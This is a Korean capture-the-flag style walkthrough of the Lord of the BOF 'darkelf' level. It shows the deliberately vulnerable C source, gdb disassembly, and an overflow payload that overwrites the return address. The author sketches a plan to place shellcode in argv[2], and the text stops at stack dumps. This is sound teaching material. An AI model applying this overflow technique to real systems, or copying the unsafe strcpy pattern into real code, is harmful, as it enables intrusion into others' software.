# Summary

문제의 소스코드를 우선 살펴보자.

```c
[wolfman@localhost wolfman]$ cat darkelf.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

}
```

이 문제의 핵심은 다음과 같다.

- 버퍼를 `\x00`으로 초기화
- 환경 변수를 `\x00`으로 초기화
- 인자 argv[1]의 길이 값 체크



`argv[1]`의 길이 값 체크 부분이 추가되었기 때문에 해당 인자에 쉘코드를 삽입해 실행할 수 없다.
그렇다면 `argv[2]`를 이용해 쉘코드를 삽입할 경우 길이 값 체크 부분은 우회될 수 있을것 같다.
먼저 tmp 폴더에 문제 파일을 그대로 복사해 실행권한을 얻고 gdb로 분석해보자.
```
[wolfman@localhost wolfman]$ mkdir tmp; cp darkelf tmp
[wolfman@localhost wolfman]$ ls
darkelf  darkelf.c  tmp
[wolfman@localhost wolfman]$ cd tmp
[wolfman@localhost tmp]$ ls
darkelf
[wolfman@localhost tmp]$ gdb -q ./darkelf
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
... 생략 ...
0x80485d7 <main+215>:	call   0x8048420 <exit>
0x80485dc <main+220>:	add    %esp,4
0x80485df <main+223>:	nop
0x80485e0 <main+224>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485e3 <main+227>:	add    %eax,4
0x80485e6 <main+230>:	mov    %edx,DWORD PTR [%eax]
0x80485e8 <main+232>:	push   %edx
0x80485e9 <main+233>:	lea    %eax,[%ebp-40]
0x80485ec <main+236>:	push   %eax
0x80485ed <main+237>:	call   0x8048440 <strcpy>
0x80485f2 <main+242>:	add    %esp,8
0x80485f5 <main+245>:	lea    %eax,[%ebp-40]
0x80485f8 <main+248>:	push   %eax
0x80485f9 <main+249>:	push   0x80486b0
0x80485fe <main+254>:	call   0x8048410 <printf>
0x8048603 <main+259>:	add    %esp,8
0x8048606 <main+262>:	push   40
0x8048608 <main+264>:	push   0
0x804860a <main+266>:	lea    %eax,[%ebp-40]
0x804860d <main+269>:	push   %eax
0x804860e <main+270>:	call   0x8048430 <memset>
0x8048613 <main+275>:	add    %esp,12
0x8048616 <main+278>:	leave
0x8048617 <main+279>:	ret
End of assembler dump.
(gdb) b *main+242
Breakpoint 1 at 0x80485f2
```



먼저 main 함수를 디스어셈블하여 strcpy 함수 실행 직후 부분인 `main+242`에 브레이크 포인트를 걸어준다.

다음 `buf+sfp`크기만큼 문자열 `A`로 덮어 씌워주고 `ret` 값을 삽입해 `run`하여 브레이크 포인트에서

스택에 값이 정상적으로 들어갔는지 확인하고 `continue` 해보니 리턴 주소가 `0xbfbfbfbf`로 변조된 것이 확인된다.

```
(gdb) r `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
Starting program: /home/wolfman/tmp/./darkelf `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`

Breakpoint 1, 0x80485f2 in main ()
(gdb) x/40wx $esp
0xbffffaf4:	0xbffffb00	0xbffffc73	0x00000012	0x41414141
0xbffffb04:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb14:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb24:	0x41414141	0x41414141	0xbfbfbfbf	0x00000000
0xbffffb34:	0xbffffb74	0xbffffb80	0x40013868	0x00000002
0xbffffb44:	0x08048450	0x00000000	0x08048471	0x08048500
0xbffffb54:	0x00000002	0xbffffb74	0x08048390	0x0804864c
0xbffffb64:	0x4000ae60	0xbffffb6c	0x40013e90	0x00000002
0xbffffb74:	0xbffffc57	0xbffffc73	0x00000000	0xbffffca4
0xbffffb84:	0xbffffcc6	0xbffffcd0	0xbffffcde	0xbffffcfd
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

Program received signal SIGSEGV, Segmentation fault.
0xbfbfbfbf in ?? ()
(gdb)
```



`continue`하여 프로그램이 실행된 직후 `esp-80` 부분을 확인해보니

이전 문제와 같이  `buffer hunter`에 의해 `buf`가 모두 0으로 초기화되었음을 확인할 수 있다.

```
(gdb) x/40wx $esp-80
0xbffffae0:	0x4000ae60	0xbffffb74	0xbffffb28	0x08048613
0xbffffaf0:	0xbffffb00	0x00000000	0x00000028	0x00000012
0xbffffb00:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb20:	0x00000000	0x00000000	0x41414141	0xbfbfbfbf
0xbffffb30:	0x00000000	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048450	0x00000000	0x08048471
0xbffffb50:	0x08048500	0x00000002	0xbffffb74	0x08048390
0xbffffb60:	0x0804864c	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc57	0xbffffc73	0x00000000
(gdb)
```



`buf` 에서 조금 떨어진 부분을 확인해보니 인자`argv[1]`에 해당되는 부분을 확인할 수 있었으며

해당 부분은 0으로 초기화되어 있지 않았다.

여기까지는 이전 문제와 동일하다.

이전 문제에서는 `argv[1]`에 쉘코드를 삽입하여 `ret`값으로 `argv[1]`에 주소 값을 주었으나

이 문제에서는 `argv[1]`의 길이 값 체크 부분이 추가되어 동일하게 문제를 풀 수는 없다.

하지만 `argv[2]`에 쉘코드를 삽입해 리턴 번지를 `argv[2]`로 overwrite해 문제를 해결할 수 있을 것 같다.

```
(gdb) x/40wx $esp-80
0xbffffae0:	0x4000ae60	0xbffffb74	0xbffffb28	0x08048613
0xbffffaf0:	0xbffffb00	0x00000000	0x00000028	0x00000012
0xbffffb00:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb20:	0x00000000	0x00000000	0x41414141	0xbfbfbfbf
0xbffffb30:	0x00000000	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048450	0x00000000	0x08048471
0xbffffb50:	0x08048500	0x00000002	0xbffffb74	0x08048390
0xbffffb60:	0x0804864c	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc57	0xbffffc73	0x00000000
(gdb)
0xbffffb80:	0xbffffca4	0xbffffcc6	0xbffffcd0	0xbffffcde
0xbffffb90:	0xbffffcfd	0xbffffd0d	0xbffffd2a	0xbffffd3b
0xbffffba0:	0xbffffd49	0xbffffd99	0xbffffdac	0xbffffdc1
0xbffffbb0:	0xbffffdd1	0xbffffdde	0xbffffdfd	0xbffffe08
0xbffffbc0:	0xbffffe15	0xbffffe1d	0x00000000	0x00000003
0xbffffbd0:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffbe0:	0x00000006	0x00000006	0x00001000	0x00000007
0xbffffbf0:	0x40000000	0x00000008	0x00000000	0x00000009
0xbffffc00:	0x08048450	0x0000000b	0x000001f9	0x0000000c
0xbffffc10:	0x000001f9	0x0000000d	0x000001f9	0x0000000e
(gdb)
0xbffffc20:	0x000001f9	0x00000010	0x0f8bfbff	0x0000000f
0xbffffc30:	0xbffffc52	0x00000000	0x00000000	0x00000000
0xbffffc40:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc50:	0x36690000	0x2f003638	0x656d6f68	0x6c6f772f
0xbffffc60:	0x6e616d66	0x706d742f	0x642f2e2f	0x656b7261
0xbffffc70:	0x4100666c	0x41414141	0x41414141	0x41414141
0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc90:	0x41414141	0x41414141	0x41414141	0xbf414141
0xbffffca0:	0x00bfbfbf	0x00000000	0x00000000	0x00000000
0xbffffcb0:	0x00000000	0x00000000	0x00000000	0x00000000
```



